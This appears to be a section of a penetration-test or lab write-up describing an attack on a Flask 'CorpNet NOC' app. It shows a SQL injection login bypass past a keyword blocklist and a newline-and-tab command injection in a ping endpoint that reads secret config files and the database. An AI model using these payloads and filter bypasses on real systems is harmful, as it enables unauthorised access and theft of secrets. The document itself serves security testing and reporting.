4. Attack Narrative
4.1 Reconnaissance
An HTTP probe against port 5050 revealed a Flask/Werkzeug application (identified via the `Server` response header):
```
Server: Werkzeug/2.0.2 Python/3.10.12
```
The application presented a login page titled CorpNet NOC — Sign In at `/internal`. Navigation links revealed additional internal endpoints: `/internal/dashboard`, `/internal/health`, and `/internal/logout`.
---
4.2 Authentication Bypass via SQL Injection
The login form at `/internal` (POST) accepted `username` and `password` fields. The server-side query was constructed via direct string interpolation with no parameterisation:
```python
# From recovered app.py
query = (
    "SELECT id, username, role FROM users "
    "WHERE username = '%s' AND password = '%s'"
) % (username, pw_hash)
```
A blocklist (`BLOCK_RE`) filtered patterns such as `UNION SELECT`, `DROP TABLE`, `INSERT INTO`, and `xp_cmdshell` — but did not prevent a simple boolean OR bypass.
Payload used:
```
username=' OR '1'='1'--
password=<anything>
```
Result: The server responded with `HTTP 302` to `/internal/dashboard` and issued a valid session cookie:
```
Set-Cookie: session=eyJyb2xlIj...
```
The application was now fully authenticated as user `netops` with role `operator`.
---
4.3 Command Injection via Health Check Endpoint
The authenticated endpoint `POST /internal/health` accepted a `target` field described as a hostname or IP address for an ICMP probe. The server executed the user-supplied value directly in a shell command:
```python
proc = subprocess.Popen(
    "ping -c 2 -W 1 " + target,
    shell=True,
    ...
)
```
A secondary blocklist (`PING_BLOCK_RE`) filtered the characters `;`, `|`, ```, `$`, and `&`:
```python
PING_BLOCK_RE = re.compile(r"[;|`$&]")
```
Newline injection bypass: The filter did not block newline characters (`\n`). Because the command runs under `shell=True`, a newline terminates the `ping` invocation and begins a new shell command. Spaces were replaced with tab characters (`\t`) — also not blocked — to pass argument separation.
Proof-of-concept (command execution):
```
target=127.0.0.1\nid
```
Response (truncated):
```
--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Arbitrary file read (using tab as IFS):
```
target=127.0.0.1\ncat\t/opt/netops/secret.config
target=127.0.0.1\ncat\t/opt/netops/app.py
target=127.0.0.1\nstrings\t/opt/netops/netops.db
```
All commands executed successfully as `www-data`.
